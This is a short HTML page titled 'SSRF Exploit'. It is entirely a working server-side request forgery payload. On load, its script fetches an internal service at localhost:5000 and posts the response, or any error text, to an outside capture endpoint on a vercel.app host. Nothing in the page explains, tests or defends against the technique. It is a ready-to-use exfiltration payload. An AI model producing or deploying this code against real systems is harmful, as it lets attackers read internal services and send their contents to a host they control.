<!DOCTYPE html>
<html>
<head>
    <title>SSRF Exploit</title>
    <script>
        (async function() {
            try {
                // Fetch data from localhost:5000
                const response = await fetch('http://localhost:5000');
                const data = await response.text();

                // Send the fetched data to your custom endpoint
                await fetch('https://ssrf-eta.vercel.app/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ response: data })
                });
            } catch (error) {
                // Send error details to your custom endpoint
                await fetch('https://ssrf-eta.vercel.app/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ error: error.message })
                });
            }
        })();
    </script>
</head>
<body>
    <p>Fetching localhost...</p>
</body>
</html>
